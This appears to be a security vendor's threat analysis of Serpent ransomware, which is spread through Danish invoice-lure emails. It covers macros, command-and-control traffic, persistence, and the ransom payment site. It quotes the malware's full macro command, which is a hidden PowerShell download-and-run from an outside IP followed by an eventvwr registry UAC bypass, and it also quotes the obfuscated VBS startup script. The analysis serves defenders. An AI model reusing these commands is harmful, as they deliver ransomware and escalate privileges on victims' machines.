@@ -1,0 +1,40 @@
+New Serpent Ransomware Targets Danish Speakers
+While Locky ransomware dominated email-borne threats for most of 2016, we continue to see new ransomware variants appear frequently as threat actors look to cash in on the trend that began with Locky early last year. Some of these variants are hastily put together and easily cracked; others are carefully designed and accompanied by effective lures. Serpent ransomware, recently detected by Proofpoint researchers and analyzed below, falls into the latter category.
+Overview
+On February 7, Proofpoint researchers discovered a new ransomware known as "Serpent" being distributed in email via links to malicious Microsoft Office documents. Currently, Proofpoint has observed this threat targeting Danish recipients using the subject "Sidste påmindelse for udestående faktura 1603750", or "Last reminder for outstanding invoice 1603750". The malicious emails contain a link to download a document with the same name as the invoice number in the subject, 1603750.doc. A sample email message is shown in Figure 1:
+
+Figure 1: Sample email message with link to malicious document; the email, written in Danish, demands payment on an overdue invoice and threatens to turn the account over to a debt collector.
+This document contains malicious macros that, when opened and enabled, begin the infection process. From our initial analysis, this ransomware appears to have been carefully developed and offers a clean decryption page that includes Support, FAQ, and various instructions to decrypt files. Currently, the ransom is set at .75 Bitcoins (approximately $787.09 USD at the time of writing) for the first seven days. After that the ransom jumps to 2.25 BTC (approximately $2366.55 USD).
+As Proofpoint researchers analyzed this threat, we observed some similarities between Serpent and the previously discovered ransomware variant known as Hades Locker[1], specifically in the Command and Control (C&C) protocol, ransom note, and distribution techniques.
+Analysis
+The first stage of this infection begins with a user downloading a malicious Microsoft Office document. When opened, the user is persuaded to enable macros by the following image:
+
+Figure 2: Malicious Microsoft Word document lure enticing user to "Enable Content" 
+Once macros are enabled, the infection process begins and the following text is displayed, masking the true intention of the document to unsuspecting victims:
+
+Figure 3: Malicious Microsoft Word document after enabling content
+Upon closer inspection, we found that the macros decode and run the following command:
+C:\Windows\System32\cmd.exe" /c powershell.exe -w hidden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('hxxp://185.163.46[.]150/software.exe','C:\Users\[user name]\AppData\Local\Temp\\puttyx86.exe') & reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d C:\Users\[user name]\AppData\Local\Temp\\puttyx86.exe /f & eventvwr.exe & PING -n 15 127.0.0.1>nul & C:\Users\[user name]\AppData\Local\Temp\\puttyx86.exe
+This command utilizes PowerShell to download the executable from 185.163.46[.]150 and saves it to C:\Users\[user name]\AppData\Local\Temp\\ as "puttyx86.exe". Next, it employs a known User Account Control (UAC) bypass technique using eventvwr.exe and the Windows Registry to execute Serpent with higher privileges without alerting the end user; this technique, has also been observed in several other infections.[2]
+Once Serpent is executed, a mutex of MUTEX000001 is created on the infected host. Additionally, Serpent collects geographical data on the infected host via an HTTP request to ipinfo[.]io/json. Shortly after, Serpent makes an HTTP POST request to the C&C server which in turn reports back several details:
+
+Figure 4: Serpent Ransomware Command & Control traffic
+The request contains a unique HWID which follows a pattern of hwid=[A-F0-9]{8}-[A-F0-9]{8}-[A-F0-9]{8}-[A-F0-9]{8}. This HWID is used to begin the decryption process. Following the HWID, there is a parameter of "campaign=" followed by a URL-encoded "%23", or “#”, and digits that can identify the campaign associated with the particular instance of Serpent. Finally, the POST contains "ip=" and "country=" parameters that return the information gleaned from the ipinfo[.]io request.
+A successful C&C reply will contain a “RSAKeyValue”, specifically a “Modulus” and “Exponent”. We did not investigate further but these are typically used for determining a symmetric key. Serpent does not encrypt files if the victim machine is not online and cannot connect to the C&C server to receive key material.
+Serpent achieves persistence on the victim machine by creating the following registry key: C:\Users\[user name]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\raesdfgiuytr.vbs. The contents of "raesdfgiuytr.vbs" will run upon startup:
+set ZDrCLRlUAizbyd = CreateobJEcT("WscRIpt.shEll") ZDRCLrluAIZbyD.Run """C:\Users\[user name]\AppData\Roaming\raesdfgiuytr\iutyfghjkoiuytf.exe"""
+During the encryption process, we initially found approximately 150 filetypes targeted, but after receiving updated information from MalwareHunterTeam (@MalwrHunterTeam), this number is closer to almost 900 targeted extensions (see Appendix A). Once Serpent has located and encrypted targeted files, the encrypted files receive a new ".serpent" file extension appended to the old extension. As an example, an encrypted file would be "BlackRectangle.bmp.serpent". Additionally, Serpent drops a ransom note in the Desktop, Documents, and Pictures folders in the form of both a text file and an HTML document. The name of the ransom note is "HOW_TO_DECRYPT_YOUR_FILES_[A-Za-z0-9]{3}.txt" and "HOW_TO_DECRYPT_YOUR_FILES_[A-Za-z0-9]{3}.html". The full text of the ransom note is available in Appendix B.
+
+Figure 5: Serpent Ransomware ransom notes, both HTML and text versions
+Upon visiting the Serpent Ransomware decryption page, victims are required to enter the HWID found in the ransom note, or they can browse directly to the decryption page by appending the HWID to the URI.
+After entering the unique HWID found in the ransom note, victims can access the main Serpent Ransomware decryption page. The home page offers instructions on how to purchase the "Serpent Decrypter" which costs .75 BTC. Serpent features a seven-day timer; the price for the Serpent Decrypter becomes 2.25 BTC if it expires. In addition to the main page, there are FAQ, Instruction, and Support pages. The "Support" page allows the victim to send the Serpent team a message. For each infection, a unique BTC Address is generated.
+
+Figure 6: Serpent Ransomware decryption website main page
+
+Figure 7: Serpent Ransomware decryption website FAQ
+
+Figure 8: Serpent Ransomware decryption website decryption instructions
+
+Figure 9: Serpent Ransomware decryption website support portal
+Conclusion
+Ransomware continues to be a growing threat, as we continue to find new ransomware and variants almost daily. Serpent is no exception, and appears to have been crafted with care and professionalism when compared to other "home-grown" ransomware variants. While the distribution of Serpent is currently at a lower scale than that of Cerber, Sage 2.0, and others, it has the potential to become another player in the game of widely distributed ransomware. With Serpent, we continue to see distribution tricks such as download links to malicious documents in emails, rather than just document attachments. As ransomware creation and distribution show no sign of slowing down, we will continue to monitor the evolution of these threats and their impact on businesses and individuals.
